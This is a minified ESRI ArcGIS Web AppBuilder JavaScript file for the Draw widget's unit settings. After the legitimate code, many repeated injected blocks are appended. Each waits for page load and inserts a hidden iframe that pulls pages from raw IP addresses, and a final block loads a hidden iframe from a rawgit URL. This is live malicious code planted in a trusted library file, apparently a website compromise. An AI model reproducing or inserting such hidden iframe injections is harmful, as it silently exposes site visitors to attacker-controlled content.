// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"widgets/Draw/setting/_build-generate_module":function(){define(["dojo/text!./Setting.html","dojo/text!./css/style.css","dojo/i18n!./nls/strings"],function(){})},"url:widgets/Draw/setting/Setting.html":'\x3cdiv style\x3d"width:100%;height:auto;"\x3e\r\n  \x3cdiv class\x3d"tip" style\x3d"margin-bottom:10px;"\x3e${nls.defineUnits}\x3c/div\x3e\r\n\t\x3cdiv class\x3d"query-setting-content" data-dojo-attach-point\x3d"content"\x3e\r\n\t\t\x3cdiv class\x3d"distance-section" data-dojo-attach-point\x3d"distanceTabNode" onselectstart\x3d"return false;"\x3e\r\n\t\t\t\x3cdiv class\x3d"add-with-icon"  data-dojo-attach-point\x3d"btnAddDistance"\x3e\r\n\t\t\t\t\x3cspan class\x3d"jimu-icon jimu-icon-add" data-dojo-attach-point\x3d"btnAddDistanceIcon"\x3e\x3c/span\x3e\r\n\t\t\t\t\x3cspan class\x3d"add-label"\x3e${nls.addDistance}\x3c/span\x3e\r\n\t\t\t\x3c/div\x3e\r\n\t\t\t\x3cdiv data-dojo-attach-point\x3d"distanceTableDiv"\x3e\x3c/div\x3e\r\n\t\t\x3c/div\x3e\r\n\t\t\x3cdiv class\x3d"output-section" data-dojo-attach-point\x3d"areaTabNode" onselectstart\x3d"return false;"\x3e\r\n\t\t\t\x3cdiv class\x3d"add-with-icon" data-dojo-attach-point\x3d"btnAddArea"\x3e\r\n\t\t\t\t\x3cspan class\x3d"jimu-icon jimu-icon-add" data-dojo-attach-point\x3d"btnAddAreaIcon"\x3e\x3c/span\x3e\r\n\t\t\t\t\x3cspan class\x3d"add-label"\x3e${nls.addArea}\x3c/span\x3e\r\n\t\t\t\x3c/div\x3e\r\n\t\t\t\x3cdiv data-dojo-attach-point\x3d"areaTableDiv"\x3e\x3c/div\x3e\r\n\t\t\x3c/div\x3e\r\n\t\x3c/div\x3e\r\n\x3c/div\x3e',
"url:widgets/Draw/setting/css/style.css":".jimu-widget-draw-setting .add-with-icon{margin-top:8px; margin-bottom:3px;}.jimu-widget-draw-setting .jimu-tab{position: static;}.jimu-widget-draw-setting .jimu-tab\x3e.jimu-viewstack{position: static; top: auto; left: auto; right: auto; bottom: auto; height: auto;}.jimu-widget-draw-setting .jimu-viewstack\x3e.view{height: auto;}.jimu-widget-draw-setting .tip{color: #000; font-size: 14px;}.jimu-widget-draw-setting .add-with-icon.jimu-state-disabled{color: #ccc; cursor: default;}.jimu-widget-draw-setting .jimu-simple-table .simple-table-cell .normal-text-div{color: #000; font-size: 14px;}",
"*now":function(l){l(['dojo/i18n!*preload*widgets/Draw/setting/nls/Setting*["ar","bs","cs","da","de","en","el","es","et","fi","fr","he","hi","hr","id","it","ja","ko","lt","lv","nb","nl","pl","pt-br","pt-pt","ro","ru","sl","sr","sv","th","tr","zh-cn","vi","zh-hk","zh-tw","ROOT"]'])},"*noref":1}});
define("dojo/_base/declare dojo/_base/lang dojo/_base/array dojo/_base/html dojo/_base/query dojo/on dijit/_WidgetsInTemplateMixin jimu/BaseWidgetSetting jimu/dijit/TabContainer jimu/utils dijit/form/Select jimu/dijit/CheckBox jimu/dijit/SimpleTable".split(" "),function(l,c,d,f,m,h,q,r,t,e,n,u,p){return l([r,q],{baseClass:"jimu-widget-draw-setting",distanceUnits:null,areaUnits:null,_disabledClass:"jimu-state-disabled",postMixInProperties:function(){this.inherited(arguments);this.distanceUnits=[{value:"KILOMETERS",
label:this.nls.kilometers,abbr:this.nls.kilometersAbbreviation||"km",conversion:e.localizeNumber(.001,{places:3})},{value:"MILES",label:this.nls.miles,abbr:this.nls.milesAbbreviation||"mi",conversion:e.localizeNumber(6.21E-4,{places:6})},{value:"METERS",label:this.nls.meters,abbr:this.nls.metersAbbreviation||"m",conversion:e.localizeNumber(1)},{value:"FEET",label:this.nls.feet,abbr:this.nls.feetAbbreviation||"ft",conversion:e.localizeNumber(3.2808,{places:4})},{value:"YARDS",label:this.nls.yards,
abbr:this.nls.yardsAbbreviation||"yd",conversion:e.localizeNumber(1.0936133,{places:7})},{value:"NAUTICAL_MILES",label:this.nls.nauticalmiles,abbr:this.nls.nauticalmilesAbbreviation||"nm",conversion:e.localizeNumber(5.39956803455,{places:9})+"e-4"}];this.areaUnits=[{value:"SQUARE_KILOMETERS",label:this.nls.squareKilometers,abbr:this.nls.squareKilometersAbbreviation||"sq km",conversion:e.localizeNumber(1E-6,{places:6})},{value:"SQUARE_MILES",label:this.nls.squareMiles,abbr:this.nls.squareMilesAbbreviation||
"sq mi",conversion:e.localizeNumber(3.861021,{places:6})+"e-7"},{value:"ACRES",label:this.nls.acres,abbr:this.nls.acresAbbreviation||"ac",conversion:e.localizeNumber(2.4710538147E-4,{places:14})},{value:"HECTARES",label:this.nls.hectares,abbr:this.nls.hectaresAbbreviation||"ha",conversion:e.localizeNumber(1E-4,{places:4})},{value:"SQUARE_METERS",label:this.nls.squareMeters,abbr:this.nls.squareMetersAbbreviation||"sq m",conversion:e.localizeNumber(1)},{value:"SQUARE_FEET",label:this.nls.squareFeet,
abbr:this.nls.squareFeetAbbreviation||"sq ft",conversion:e.localizeNumber(10.763910417,{places:9})},{value:"SQUARE_YARDS",label:this.nls.squareYards,abbr:this.nls.squareYardsAbbreviation||"sq yd",conversion:e.localizeNumber(1.19599005,{places:8})}]},postCreate:function(){this.inherited(arguments);this.distanceTable=new p({fields:[{name:"label",title:this.nls.label,"class":"label",type:"empty"},{name:"abbr",title:this.nls.abbr,"class":"abbr",type:"text",editable:!1},{name:"conversion",title:this.nls.conversion,
"class":"conversion",type:"text",editable:!1},{name:"actions",title:this.nls.actions,"class":"actions",type:"actions",actions:["up","down","delete"]}]});this.distanceTable.placeAt(this.distanceTableDiv);this.areaTable=new p({fields:[{name:"label",title:this.nls.label,"class":"label",type:"empty"},{name:"abbr",title:this.nls.abbr,"class":"abbr",type:"text",editable:!1},{name:"conversion",title:this.nls.conversion,"class":"conversion",type:"text",editable:!1},{name:"actions",title:this.nls.actions,
"class":"actions",type:"actions",actions:["up","down","delete"]}]});this.areaTable.placeAt(this.areaTableDiv);this.cbxOperationalLayer=new u({label:this.nls.operationalLayer,style:"margin-top:10px;"});f.addClass(this.cbxOperationalLayer.domNode,"tip");this.cbxOperationalLayer.placeAt(this.domNode);this.own(h(this.btnAddDistance,"click",c.hitch(this,this._addDistance)));this.own(h(this.btnAddArea,"click",c.hitch(this,this._addArea)));this.own(h(this.distanceTable,"row-delete",c.hitch(this,function(a){a.select&&
(a.select.destroy(),delete a.select);this._resetDistanceSelectOptions();this._checkStatusForBtnAddDistance()})));this.own(h(this.areaTable,"row-delete",c.hitch(this,function(a){a.select&&(a.select.destroy(),delete a.select);this._resetAreaSelectOptions();this._checkStatusForBtnAddArea()})));this.setConfig(this.config)},startup:function(){this.inherited(arguments);this.tabContainer=new t({tabs:[{title:this.nls.distance,content:this.distanceTabNode},{title:this.nls.area,content:this.areaTabNode}],isNested:!0},
this.content);this.tabContainer.startup()},setConfig:function(a){a.isOperationalLayer=!!a.isOperationalLayer;this.config=a;this._setDistanceTable(this.config.distanceUnits);this._setAreaTable(this.config.areaUnits);this.cbxOperationalLayer.setValue(a.isOperationalLayer)},_setDistanceTable:function(a){this.distanceTable.clear();d.forEach(a,c.hitch(this,function(a){var b=this._getDistanceUnitInfo(a.unit);b&&(b.abbr=a.abbr,this._addDistanceUnitRow(b))}))},_setAreaTable:function(a){this.areaTable.clear();
d.forEach(a,c.hitch(this,function(a){var b=this._getAreaUnitInfo(a.unit);b&&(b.abbr=a.abbr,this._addAreaUnitRow(b))}))},getConfig:function(){var a={distanceUnits:[],areaUnits:[],isOperationalLayer:!1};a.distanceUnits=this._getDistanceConfig();a.areaUnits=this._getAreaConfig();a.isOperationalLayer=this.cbxOperationalLayer.getValue();return a},_getDistanceConfig:function(){var a=[],a=this.distanceTable.getRows();return a=d.map(a,c.hitch(this,function(a){var b=this.distanceTable.getRowData(a);return{unit:a.select.get("value"),
abbr:b.abbr}}))},_getAreaConfig:function(){var a=[],a=this.areaTable.getRows();return a=d.map(a,c.hitch(this,function(a){var b=this.areaTable.getRowData(a);return{unit:a.select.get("value"),abbr:b.abbr}}))},_getAllDistanceUnitValues:function(){return d.map(this.distanceUnits,c.hitch(this,function(a){return a.value}))},_getUsedDistanceUnitValues:function(){var a=this.distanceTable.getRows();return d.map(a,c.hitch(this,function(a){return a.select.get("value")}))},_getNotUsedDistanceUnitValues:function(){var a=
this._getAllDistanceUnitValues(),b=this._getUsedDistanceUnitValues();return d.filter(a,c.hitch(this,function(a){return 0>d.indexOf(b,a)}))},_getDistanceUnitInfo:function(a){var b=null,k=d.filter(this.distanceUnits,c.hitch(this,function(b){return b.value===a}));0<k.length&&(b=c.mixin({},k[0]));return b},_addDistance:function(){var a=this._getNotUsedDistanceUnitValues();0!==a.length&&(a=this._getDistanceUnitInfo(a[0]),this._addDistanceUnitRow(a))},_checkStatusForBtnAddDistance:function(){0===this._getNotUsedDistanceUnitValues().length?
(f.addClass(this.btnAddDistance,this._disabledClass),f.addClass(this.btnAddDistanceIcon,this._disabledClass)):(f.removeClass(this.btnAddDistance,this._disabledClass),f.removeClass(this.btnAddDistanceIcon,this._disabledClass))},_addDistanceUnitRow:function(a){var b=this.distanceTable.addRow({abbr:a.abbr,conversion:a.conversion});if(b.success&&b.tr){var b=b.tr,d=m(".simple-table-cell",b)[0];f.setStyle(d,"verticalAlign","middle");var g=new n({style:"width:100%;height:18px;line-height:18px;"});g.placeAt(d);
g.startup();g.addOption({value:a.value,label:a.label,selected:!0});this.own(h(g,"change",c.hitch(this,this._resetDistanceSelectOptions)));b.select=g}this._resetDistanceSelectOptions();this._checkStatusForBtnAddDistance()},_showCorrectDistanceInfoBySelectedOption:function(a){var b=this._getDistanceUnitInfo(a.select.value);this.distanceTable.editRow(a,{abbr:b.abbr,conversion:b.conversion})},_resetDistanceSelectOptions:function(){var a=this.distanceTable.getRows(),b=d.map(a,c.hitch(this,function(a){return a.select})),
k=this._getNotUsedDistanceUnitValues(),g=d.map(k,c.hitch(this,function(a){return this._getDistanceUnitInfo(a)}));d.forEach(b,c.hitch(this,function(b,k){var e=b.get("value"),f=d.filter(b.getOptions(),c.hitch(this,function(a){return a.value!==e}));b.removeOption(f);d.forEach(g,c.hitch(this,function(a){b.addOption({value:a.value,label:a.label})}));b.set("value",e);this._showCorrectDistanceInfoBySelectedOption(a[k])}))},_getAllAreaUnitValues:function(){return d.map(this.areaUnits,c.hitch(this,function(a){return a.value}))},
_getUsedAreaUnitValues:function(){var a=this.areaTable.getRows();return d.map(a,c.hitch(this,function(a){return a.select.get("value")}))},_getNotUsedAreaUnitValues:function(){var a=this._getAllAreaUnitValues(),b=this._getUsedAreaUnitValues();return d.filter(a,c.hitch(this,function(a){return 0>d.indexOf(b,a)}))},_getAreaUnitInfo:function(a){var b=null,e=d.filter(this.areaUnits,c.hitch(this,function(b){return b.value===a}));0<e.length&&(b=c.mixin({},e[0]));return b},_addArea:function(){var a=this._getNotUsedAreaUnitValues();
0!==a.length&&(a=this._getAreaUnitInfo(a[0]),this._addAreaUnitRow(a))},_checkStatusForBtnAddArea:function(){0===this._getNotUsedAreaUnitValues().length?(f.addClass(this.btnAddArea,this._disabledClass),f.addClass(this.btnAddAreaIcon,this._disabledClass)):(f.removeClass(this.btnAddArea,this._disabledClass),f.removeClass(this.btnAddAreaIcon,this._disabledClass))},_addAreaUnitRow:function(a){var b=this.areaTable.addRow({abbr:a.abbr,conversion:a.conversion});if(b.success&&b.tr){var b=b.tr,d=m(".simple-table-cell",
b)[0];f.setStyle(d,"verticalAlign","middle");var e=new n({style:"width:100%;height:18px;line-height:18px;"});e.placeAt(d);e.startup();e.addOption({value:a.value,label:a.label,selected:!0});this.own(h(e,"change",c.hitch(this,this._resetAreaSelectOptions)));b.select=e}this._resetAreaSelectOptions();this._checkStatusForBtnAddArea()},_showCorrectAreaInfoBySelectedOption:function(a){var b=this._getAreaUnitInfo(a.select.value);this.areaTable.editRow(a,{abbr:b.abbr,conversion:b.conversion})},_resetAreaSelectOptions:function(){var a=
this.areaTable.getRows(),b=d.map(a,c.hitch(this,function(a){return a.select})),e=this._getNotUsedAreaUnitValues(),f=d.map(e,c.hitch(this,function(a){return this._getAreaUnitInfo(a)}));d.forEach(b,c.hitch(this,function(b,e){var g=b.get("value"),h=d.filter(b.getOptions(),c.hitch(this,function(a){return a.value!==g}));b.removeOption(h);d.forEach(f,c.hitch(this,function(a){b.addOption({value:a.value,label:a.label})}));b.set("value",g);this._showCorrectAreaInfoBySelectedOption(a[e])}))}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});